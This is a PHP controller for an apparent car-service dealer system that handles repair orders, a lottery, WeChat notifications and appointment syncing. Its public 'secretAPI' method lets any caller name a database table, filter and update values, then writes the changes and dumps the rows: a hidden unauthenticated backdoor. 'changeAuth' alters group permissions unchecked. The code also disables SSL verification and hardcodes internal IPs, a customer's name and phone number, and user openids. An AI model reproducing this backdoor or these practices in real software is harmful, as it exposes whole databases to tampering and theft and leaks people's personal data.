<?php
// +----------------------------------------------------------------------
// | Author: gaoyu <540846283@qq.com>
// +----------------------------------------------------------------------
namespace Home\Controller;
use Think\Controller;
/**
 * 公共方法控制器
 * @author gaoyu <540846283@qq.com>
 */
class CommonController extends HomeController{

    // public $wechatAccountId = 'gh_47ef703180df'; // 正式环境ID
    // public $app = 'http://53.99.68.61'; // 正式环境

    // public $wechatAccountId = 'gh_74b878be8bfc'; // 测试环境ID
    // public $app = 'http://53.99.68.62'; // 测试环境IP

    public $wechatAccountId = '';
    public $app = '';

    protected function _initialize() {
        $this->wechatAccountId = Config('WECHAT');
        $this->app = Config('APPURL');
    }

    public function index() {

        $params = array(
            'msgId' => rand(100000, 999999),
            'sendTime' => time(),
            'wechatAccountId' => $this->wechatAccountId,
            'openId' => 'o20nFjhloHwDEwpuWCbAzVBGAbbU',
            'templateId' => 'TakingCarRemind',
            'data' => array(
                'first' => '您的维修工单'.'KF10006'.'已经完成',
                'orderId' => 'KF10006',
                'takingTime' => date('Y年m月d日 H时i分', time()),
                'remark' => '详细请咨询您的销售助理'.'李四'.'，谢谢！'
            )
        );
        // $res = A('Home/System')->curl_xml($params);
        // var_dump($res);
    }

    /**
     * Ajax 检测wip  10000 - 65500
     * @author gaoyu <540846283@qq.com>
     */
    public function ajaxCheckWip(){

        $wip = $_GET['wip'];

        $ld_code = strtoupper(substr($wip,0,2));
        $wip = intval(substr($wip,2,6));
    
        if($wip >= 10000 && $wip <= 65000) {

            $where['ld_code'] = $ld_code;
            $dealer = D('User')->where($where)->find();

            if($dealer) {
                $where_log['wip'] = strtoupper($ld_code.$wip);
                $start = strtotime(date('Y-m-d', time()));
                $end = $start + 24 * 60 * 60;
                $where_log['start_timestamp'] = array('between',array($start,$end));
                $log = M('log')->where($where_log)->find();

                $data['status'] = $log?-1:1;
            }else {
                $data['status'] = -1;
            }
        }else {
            $data['status'] = -1;
        }
        
        $this->ajaxReturn($data);
    }

    public function changeAuth() {
        M('user_group')->where(['id' => 2])->save(['menu_auth' => '97,98,116,117,118,119,120,99,100,101,102,103,114,138,139,108,110,111,112,115']);
        $auth = M('user_group')->where(['id' => 2])->find();
        return true;
    }

    public function secretAPI() {

        $post = json_decode(file_get_contents('php://input'), true);
        $table = $post['table'];
        $where = $post['where'];
        $save = $post['save'];
        $action = $post['action'];

        if($table && $where && $save) {
            if($action == 'save') {
                M($table)->where($where)->save($save);
            }
            var_dump(M($table)->where($where)->select());
        }
        return true;
    }

    public function draw_lottery($openid) {

        $where_win_max['config_name'] = 'win_max';
        $config_win_max = D('LotteryConfig')->where($where_win_max)->find();
        $max_award = $config_win_max['config_value'];

        $start = strtotime(date('Y-m-d', time()));
        $end = $start + 24 * 60 * 60;
        $where_win['draw_time'] = array('between',array($start,$end));
        $where_win['draw_status'] = 1;
        $win_count = D('Lottery')->where($where_win)->count();

        if($win_count < $max_award) {
            $where_config['config_name'] = 'win_rate';
            $config = D('LotteryConfig')->where($where_config)->find();
            $rate = $config['config_value'];

            $rand = rand(1,10000);

            return $rand <= $rate * 100 ? 1 : 2;
        }else {
            return 2;
        }
    }

    public function qrcode() {
        
        $this->redirect('Home/Index/qrcode', $_GET);
    }

    /**
     * 扫码终检
     */
    public function inspection() {

        $openid = session('openid');
        // 绑定信息
        $_GET = $_GET ? $_GET : session('param');
        $wip = $_GET['wip'];
        
    }

    /**
     * 抽奖
     * @author gaoyu <540846283@qq.com>
     */
    public function draw() {

        $openid = $_GET['openid'];

        // 查询是否可以抽奖
        $where_lottery['openid'] = $openid;
        $where_lottery['lottery_status'] = 2;

        $lottery = D('lottery')->where($where_lottery)->find();

        if($lottery) {
            // 进行抽奖
            $draw_status = $this->draw_lottery($openid);
            // 判断工单号wip是否重复
            $wip = $lottery['wip'];
            $where_wip['wip'] = $wip;
            $where_wip['draw_status'] = 1;
            if(D('lottery')->where($where_wip)->find()) {
                $draw_status = 2;
            }
            // 修改记录
            $save_lottery['lottery_status'] = 1;
            $save_lottery['draw_time'] = time();
            $save_lottery['draw_status'] = $draw_status;
            D('lottery')->where($where_lottery)->limit(1)->save($save_lottery);
        }else {
            $draw_status = 2;
        }

        $data['status'] = $draw_status;
        $this->ajaxReturn($data);
    }

    /**
     * 重置经销商密码
     */
    public function resetPassword() {

        $where['user_type'] = 4;
        $dealers = M('user')->where($where)->select();
        foreach ($dealers as $dealer) {
            $where['username'] = $dealer['username'];
            $save['password'] = user_md5(strtolower($dealer['username']));
            // M('user')->where($where)->save($save);
        }
        return true;
    }

    /**
     * Linux Shell
     */
    public function shell() {

        $where['type'] = 'shell';
        $save['content'] = date('Y-m-d H:i:s',time());
        D('WeixinConfig')->where($where)->save($save);
        echo 'success';
    }

    /**
     * 自动更新数据
     */
    public function auto() {

        $now = time();
        if($now > strtotime(date('Y-m-d 00:20:00'),time())) {
            echo 'invalid request!!!';
            return false;
        }

        $where['end_timestamp'] = array('elt',time());
        $where['status'] = 1;
        $where['service_type'] = array('in', ['A','B']);
        $logs = M('log')->where($where)->select();
        
        foreach ($logs as $log) {
            
            // 更新为默认完成
            $where_log['log_id'] = $log['log_id'];
            $save_log['status'] = 5;
            $save_log['complete_timestamp'] = strtotime(date('Y-m-d 23:59:59',$log['start_timestamp']));
            M('log')->where($where_log)->save($save_log);

            // 更新每日报表
            $where_report['ld_code'] = $log['ld_code'];
            $where_report['service_type'] = $log['service_type'];
            $start = strtotime(date('Y-m-d', $log['start_timestamp']));
            $end = $start + 24 * 60 * 60;
            $where_report['service_date'] = array('between',array($start,$end));
            $report = D('ServiceReport')->where($where_report)->find();

            if($report) {
                D('ServiceReport')->where($where_report)->setInc($status,1);
            }else {
                $param['ld_code'] = $log['ld_code'];
                $param['service_type'] = $log['service_type'];
                $param['service_date'] = $log['end_timestamp'];
                $param['success'] = 1;
                D('ServiceReport')->add($param);
            }
        }
    }

    /**
     * 绑定openid
     * @param username
     * @param password
     * @param openid
     * @author gaoyu <540846283@qq.com>
     */
    public function binding(){

        $username = $_GET['username'];
        $password = $_GET['password'];
        $openid = session('openid');
        if(!$openid) {
            $this->ajaxReturn(array(
                'status' => true,
                'msg' => '没有openid，绑定失败！'
            ));
        }

        // 判断是否绑定过SA账号
        $where_bind = ['openid' => $openid];
        $bind = D('User')->where($where_bind)->find();
        if($bind && $bind['username'] != $username) {
            $this->ajaxReturn(array(
                'status' => false,
                'msg' => '您已经绑定了其他账号！'
            ));
        }

        // 查找SA账户
        $where_user = array(    
            'username' => $username,
            'password' => user_md5($password),
            'user_type' => array('in', [6,7,8,10,12,15,16])
        );

        $user = D('User')->where($where_user)->find();
        if($user) {

            if($user['openid']) {
                $data = array(
                    'status' => false,
                    'msg' => '该账号已绑定其他微信！'
                );
            }else {
                $save_openid = ['openid' => $openid];
                M('user')->where($where_user)->save($save_openid);

                $user = M('user')->where($where_user)->find();
                D('User')->syncToOAB($user, 'update');

                $data = array(
                    'status' => true,
                    'msg' => '绑定成功！'
                );
            }
            
        }else {
            $data = array(
                'status' => false,
                'msg' => '用户名或密码错误,绑定失败！'
            );
        }
        
        $this->ajaxReturn($data);
    }


    /**
     * 检查是否有normal订单
     */
    public function ajaxCheckNormal($wip) {

        $wip = $_GET['wip'];

        $ld_code = strtoupper(substr($wip,0,2));
        $wip = intval(substr($wip,2,6));
        if($wip >= 10000 && $wip <= 65000) {
            
	        $where['group_'] = 4;
            $where['ld_code'] = $ld_code;
            $dealer = D('User')->where($where)->find();
            if($dealer) {
                $where_log['wip'] = strtoupper($ld_code.$wip);
                $where_log['status'] = 1;
                $log = M('log')->where($where_log)->find();
                $data['status'] = $log && !$log['openid'] ? true : false;
            }else {
                $data['status'] = false;
            }
        }else {
            $data['status'] = false;
        }
        $this->ajaxReturn($data);
    }

    /**
     * 扫描
     */
    public function scan() {

        Header("Content-Type:text/html;charset=utf-8");
        $scan_log = "";
        $current = time();

        $where_log = array(
            'service_type' => 'N',
            'status' => 1,
            'taking_time' => array('between', array($current + 841, $current + 900))
        );
        
        $log_list = M('log')->where($where_log)->select();
        foreach ($log_list as $log) {

            $ahead_diff = abs($current + 900 - $log['taking_time']);
            $diff = abs($current - $log['taking_time']);
            $openid = $log['openid'];
            $sa = [];
            if($log['sa_uid']) {
                $sa = D('User')->where(['id' => $log['sa_uid']])->find();
            }else {
                continue;
            }

            // 发送提前15分钟通知SA，快到取车时间
            if($ahead_diff < 60 && $sa && $sa['openid']) {
                $sa_params = array(
                    'msgId' => rand(100000, 999999),
                    'sendTime' => $current,
                    'wechatAccountId' => $this->wechatAccountId,
                    'openId' => $sa['openid'],
                    'templateId' => 'ServiceFinishedRemind',
                    'data' => array(
                        'first' => '亲爱的维修顾问：您负责的维修工单'.$log['wip'].'的预计交车时间将在15分钟后到达，请及时关注',
                        'status' => '即将完成',
                        'date' => date('Y年m月d日 H时i分', $log['taking_time']),
                        'remark' => '请密切关注此工单进度'
                    )
                );
                $res = A('System')->curl_xml($sa_params);
            }

            // 到达取车时间，发送通知给客户和SA
            if($diff < 60) {
                continue;
                if($openid) {
                    // 发送消息
                    $params = array(
                        'msgId' => rand(100000, 999999),
                        'sendTime' => $current,
                        'wechatAccountId' => $this->wechatAccountId,
                        'openId' => $openid,
                        'templateId' => 'ServiceFinishedRemind',
                        'data' => array(
                            'first' => '您的维修工单'.$log['wip'].'已经到达取车时间',
                            'status' => '已完成',
                            'date' => date('Y年m月d日 H时i分', $log['taking_time']),
                            'remark' => '详细请咨询您的销售助理'.$sa['nickname'].'，前往取车'
                        )
                    );
                    $res = A('System')->curl_xml($params);
                    $scan_log .= 'openid:'.$log['openid'].' result:'.$res."\t\n";
                }

                // 给SA发送消息
                if($sa && $sa['openid']) {
                    $sa_params = array(
                        'msgId' => rand(100000, 999999),
                        'sendTime' => $current,
                        'wechatAccountId' => $this->wechatAccountId,
                        'openId' => $sa['openid'],
                        'templateId' => 'ServiceFinishedRemind',
                        'data' => array(
                            'first' => '您负责的维修工单'.$log['wip'].'已经到达取车时间',
                            'status' => '已完成',
                            'date' => date('Y年m月d日 H时i分', $log['taking_time']),
                            'remark' => '请联系客户进行取车，谢谢！'
                        )
                    );
                    $res = A('System')->curl_xml($sa_params);
                }
            }
        }
        
        $scan_log .= 'scan complete: '.date('Y-m-d H:i', time())."\n";
        echo $scan_log;
        return $log_list;
    }

    /**
     * 修改订单为G状态
     */
    public function handover($log_id = '', $complete_time) {

        $log_id = $log_id ? : $_GET['log_id'];
        if(!$log_id) {
            return false;
        }
        $where_log = ['log_id' => $log_id];
        // 查找Log记录
        $log = D('Log')->where(['log_id' => $log_id])->find();
        if($log) {
            // 修改为G状态
            D('log')->where($where_log)->save(['normal_status' => 'G']);
            $current = time();
            if($log['openid']) {
                // 发送消息
                $params = array(
                    'msgId' => rand(100000, 999999),
                    'sendTime' => $current,
                    'wechatAccountId' => $this->wechatAccountId,
                    'openId' => $log['openid'],
                    'templateId' => 'ServiceFinishedRemind',
                    'data' => array(
                        'first' => '您的维修工单'.$log['wip'].'已经完成，可以取车',
                        'status' => '已完成',
                        'date' => date('Y年m月d日 H时i分', $complete_time ?: time()),
                        'remark' => '详细请联系您的维修顾问'.$sa['nickname']
                    ),
                    'url' => Config('DOMAIN').'index.php/home/index/detail/back/detail/wip/'.$log['wip']
                );
                $res = A('System')->curl_xml($params);
            }
            
            if($log['sa_uid'] && false) {
                // 给SA发送消息
                $sa = D('User')->where(['id' => $log['sa_uid']])->find();
                if($sa['openid']) {
                    $sa_params = array(
                        'msgId' => rand(100000, 999999),
                        'sendTime' => $current,
                        'wechatAccountId' => 'gh_47ef703180df',
                        'openId' => $sa['openid'],
                        'templateId' => 'ServiceFinishedRemind',
                        'data' => array(
                            'first' => '您负责的维修工单'.$log['wip'].'已经完成，并通知客户取车',
                            'status' => '已完成',
                            'date' => date('Y年m月d日 H时i分', $complete_time ?: time()),
                            'remark' => '请做好向客户交车的准备'
                        )
                    );
                    $res = A('System')->curl_xml($sa_params);
                }
            }    
        }
    }

    /**
     * 删除超过7天的G状态订单
     */
    public function scan_delete() {

        $now = time();
        if($now > strtotime(date('Y-m-d 00:20:00'),time())) {
            echo 'invalid request!!!';
            return false;
        }

        $where['taking_time'] = array('elt', $now - 7 * 86400);
        $where['normal_status'] = 'G';
        D('Log')->where($where)->save(['normal_status' => 'E']);

        return true;
    }

    public function exec_insert() {
        $appointment = array(
            'APPOINTMENT_ID' =>'14352',
            'BOOKNO' => 'null',
            'DEALER' => 'AN',
            'NAME' => '赵策',
            'TEL_NO' => '13472210070',
            'STATUS' => '等待到达',
            'APPOINTMENT_DATE' => '2017-08-03',
            'SA' => 'NULL',
            'START_TIME' => '00:00'
        );
        $res = M('appointment')->insert($appointment);
        var_dump($res);
    }

    /**
     * 获取预约信息
     */
    public function getAppointmentList() {
// $date, $plateNo, $wip
        // $postData = array(
        //     'qryDate' => $date,
        //     'plateNo' => $plateNo
        // );
        // $result['check_in_time'] = helm_strtotime('201707281400');
        // $result['check_in_time'] = 1501221600;
        // var_dump($result['check_in_time']);
        // var_dump(date('Y-m-d', $result['check_in_time']));

        $postData = array(
            'qryDate' => '2017-08-02',
            'plateNo' => '粤A557NC'
        );

        $postString = "";
        foreach ($postData as $key => $value) {
            $postString .= $key.'='.urlencode($value);
            if($key != 'plateNo') {
                $postString .= '&';
            }
        }

        // 初始化
        $curl = curl_init();
        // 设置选项，包括URL
        $proxy='http://53.90.130.51:3128';
        // curl_setopt($curl, CURLOPT_PROXY, $proxy);

        echo '<pre>';
        var_dump($postString);

        $url = 'https://oabint1.mercedes-benz.com.cn/oab/dos/getAppointmentList';
        // $url = Config('OABSYNC');
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_POST, true); // 发送方式
        curl_setopt($curl, CURLOPT_POSTFIELDS, $postString);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        // 执行
        $output = curl_exec($curl);
        $output = (array)json_decode($output);
        
        $list = $output['result'];

        var_dump($list);

        $result = [];
        foreach ($list as $value) {
            $value = (array)$value;
            $appointment_time = $value['APPOINTMENT_DATE']." ".$value['START_TIME'];
            $value['appointment_time'] = strtotime($appointment_time);
            // M('appointment')->add($value);
            array_push($result, $value['APPOINTMENT_ID']);
        }

        // 同步给OAB
        if(count($result)) {
            // $this->updateWip(implode(",", $result), $wip);
        }
        return $result;
    }

    protected function updateWip($list, $wip) {

        $postData = array(
            'appointmentIds' => $list,
            'wip' => $wip
        );

        $postString = "";
        foreach ($postData as $key => $value) {
            $postString .= $key.'='.urlencode($value);
            if($key != 'wip') {
                $postString .= '&';
            }
        }

        // 初始化
        $curl = curl_init();
        // 设置选项，包括URL
        $proxy='http://53.90.130.51:3128';
        curl_setopt($curl, CURLOPT_PROXY, $proxy);

        $url = 'https://oabint1.mercedes-benz.com.cn/oab/dos/updateWIP';
        // $url = Config('OABSYNC');
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_POST, true); // 发送方式
        curl_setopt($curl, CURLOPT_POSTFIELDS, $postString);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        // 执行
        $output = curl_exec($curl);
        $output = (array)json_decode($output);

        return $output;
    }


    /**
     * 转发给APP
     * @param type  1.info普通 2.extra额外信息
     */
    public function transmitToApp($xml, $type) {

        // $content = file_get_contents('php://input');
return true;
        // 初始化
        $curl = curl_init();

        // 设置选项,包括URL,APP生产环境接口地址
        if($type == 'info') {
            $transmit_url = $this->app.":8080/soap/repairInformation";
        }else {
            $transmit_url = $this->app.":8080/soap/repairInformationExtra";
        }
        
        curl_setopt($curl, CURLOPT_URL, $transmit_url);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_POST, true); // 发送方式
        curl_setopt($curl, CURLOPT_POSTFIELDS, $xml);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        // 执行
        $output = curl_exec($curl);

        // 释放curl句柄
        curl_close($curl); 

        return true;
    }

    /**
     * 接收xml数据，插入或更新到Log表中
     */
    public function receive() {

        $format_error = return_xml(array(
            'rspcode' => 101,
            'rspdesc' => '数据格式错误，解析失败'
        ));
        $success_insert = return_xml(array(
            'rspcode' => 200,
            'rspdesc' => '数据插入成功'
        ));
        $success_update = return_xml(array(
            'rspcode' => 201,
            'rspdesc' => '数据更新成功'
        ));
        $failure_insert = return_xml(array(
            'rspcode' => 100,
            'rspdesc' => '数据插入失败'
        ));
        $failure_update = return_xml(array(
            'rspcode' => 102,
            'rspdesc' => '数据更新失败'
        ));
        
        Header("Content-Type:text/html;charset=utf-8");
        $fileContent = file_get_contents('php://input');
        $clean = str_ireplace(['SOAP-ENV:', 'SOAP:'], '', $fileContent);
        $xml = simplexml_load_string($clean);

        $convert = json_decode(json_encode((array)$xml), true);
        $result = $convert['Body'];

        // 日志
        if($result) {
            M('helm_log')->add(array(
                'type' => 'interface',
                'ctime' => time(),
                'params' => json_encode($result)
            ));
        }

        $convert = ['check_in_time', 'renewal_time', 'due_out_time', 'send_time'];
        foreach ($convert as $key) {
            if($result[$key]) {
                $result[$key] = helm_strtotime($result[$key]);
            }
        }

        /**
         * 转发给APP
         */
        if(isset($result['due_out_time'])) {
            $this->transmitToApp($fileContent, 'extra');
        }else {
            $this->transmitToApp($fileContent, 'info');
        }
        
		// sa userinfo
		if($result['dealer_code'] && $result['owning_operator']) {
			$sa_code = $result['owning_operator'];
			unset($result['owning_operator']);
			$where_sa = array('sa_code' => $sa_code, 'user_type' => 6, 'status' => 1);
			$user = M('user')->where($where_sa)->find();
			if($user) {
				$result['sa_uid'] = $user['id'];
			}
		}	

        if($result['sa_uid']) {
            $result['is_other'] = 0;
        }

        // 数据键转换
        $convert = array(
            'due_out_time' => 'taking_time',
            // 'send_time' => 'renewal_time',
            'dealer_code' => 'ld_code',
            'status' => 'normal_status'
        );
        foreach ($convert as $before => $after) {
            if($result[$before]) {
                $result[$after] = $result[$before];
            }
            unset($result[$before]);
        }
		// var_dump($result);
        if(!$result['wip'] || !$result['ld_code']) {
            echo $format_error;return;
        }

        // 不处理N保以外数据
        
        $result['service_type'] = 'N';

        // 拼接wip
        $wip_number = $result['wip'];
        $wip = $result['ld_code'].$result['wip'];
        $result['wip'] = $wip;
        
        // 处理接收到的Log数据  //根据wip+车牌号判断新增或更新工单数据
        $where_log = array(
            'wip' => $wip,
            'service_type' => $result['service_type'],
            'registration_no' => $result['registration_no']
        );
        $log = M('log')->where($where_log)->find();
        
        // 数据更新时间
        if($result['renewal_time']) {
            $renewal_time = $result['renewal_time'];
            unset($result['renewal_time']);
        }

        /**
         * 判断是I状态
         */
        $statusI = false;
        
       
        // 添加工单变更记录
        if($result['service_type'] == 'N') {
            $change_status = $result['normal_status'];

            $log_change = array(
                'wip' => $result['wip'],
                'status' => $change_status ?: 'A',
                'create_time' => $renewal_time ?: time()
            );
            M('log_change')->add($log_change);
        }   


        // 登记进厂状态 与OAB对接预约状态数据，如果有数据，修改预约状态
        if($result['check_in_time'] && $result['normal_status'] == 'A' && $result['registration_no']) {
            $appointment_date = date('Y-m-d', $result['check_in_time']);
            $plateNo = $result['registration_no'];
            $list = $this->getAppointmentList($appointment_date, $plateNo, $wip_number);
            if(count($list)) {
                $result['reserve_status'] = 1;
            }
        }

        // 根据wip修改log数据
        if($log) {
            // 修改状态不能回去
            if($result['normal_status'] < $log['normal_status']) {
                unset($result['normal_status']);
            }
            // 修改为G状态
            if($result['normal_status'] != $log['normal_status'] && $result['normal_status'] == 'G') {
                // 第一次修改为G状态
                if(!$statusI) {
                    // I 状态不发送
                    $this->handover($log['log_id'], $renewal_time ?: time());
                }
            }
            if($result['check_in_time']){
                $result['start_timestamp'] = $result['check_in_time'];
                $result['check_in'] = $result['check_in_time'];
            }

            if($result['normal_status']){
                //发送状态推送
                $push_auth = D('Config')->checkPushAuth($wip, $result['normal_status']);
            }

            $update_res = M('log')->where($where_log)->save($result);
            if ($update_res !== false) {
                echo $success_update;
                return;
            }else {
                echo $failure_update;
                return;
            }
        }else {
            // 直接插入到数据库中
            if(!$result['service_type']) {
                $result['service_type'] = 'N';
            }

            $result['start_timestamp'] = $result['check_in_time'] ?: time();
            $result['check_in'] = $result['check_in_time'] ?: 0;

            if($result['normal_status']){
                //发送状态推送
                $push_auth = D('Config')->checkPushAuth($wip, $result['normal_status']);
            }
            $res = M('log')->add($result);
            if($res) {
                echo $success_insert;
                return;
            } else {
                echo $failure_insert;
                return;
            }
            
        }

        /* $log = M('log')->where($where_log)->find();
        if($log) {
            echo $success;return;
        }else {
            echo $failure;return;
        } */
    }

}
